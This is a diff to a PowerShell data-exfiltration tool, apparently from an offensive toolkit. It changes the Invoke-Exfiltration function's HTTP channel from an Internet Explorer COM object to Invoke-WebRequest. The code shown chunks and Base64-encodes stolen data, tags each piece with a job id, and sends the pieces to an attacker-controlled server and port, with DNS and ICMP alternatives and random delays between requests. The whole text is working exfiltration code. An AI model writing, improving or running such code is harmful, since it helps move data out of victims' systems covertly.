@@ -102,21 +102,20 @@ function Invoke-Exfiltration {
         $q = Send-DNSRequest $server $data $jobid
     }
     ElseIf ($type -eq 'HTTP') {
-        $IE = new-object -com internetexplorer.application;
-        $q = Send-HTTPRequest $data $IE
+        $q = Send-HTTPRequest $data
         for($i=0; $i-lt$repeat; $i++){
             $str = $string.Substring($i * $Split, $Split);
             $data = $jobid + '|!|' + $i + '|!|' + 'H' + '|!|' + $str
-            $q = Send-HTTPRequest $data $IE
+            $q = Send-HTTPRequest $data
         }
         if($remainder){
             $str = $string.Substring($len-$remainder);
             $data = $jobid + '|!|' + $i + '|!|' + 'H' + '|!|' + $str
-            $q = Send-HTTPRequest $data $IE
+            $q = Send-HTTPRequest $data
             $i++
         }
         $data = $jobid + '|!|' + $i + '|!|DONE'
-        $q = Send-HTTPRequest $data $IE
+        $q = Send-HTTPRequest $data
     }
     ElseIf ($type -eq 'ICMP') {
         $q = Send-ICMPPacket $data
@@ -156,10 +155,10 @@ function Invoke-Exfiltration {
 }
 
 function Send-HTTPRequest {
-    param ([string] $data, [System.__ComObject] $IE)
-    $url = "http://" + $server + ":" + $port + "/";
+    param ([string] $data)
     $data = Base64 $data;
-    $IE.navigate2($url+$data)
+    $url = "http://" + $server + ":" + $port + "/" + $data;
+    Invoke-WebRequest $url
     If (!$sleep) {
         $sleep = Get-Random -minimum 0 -maximum 8; 
     }
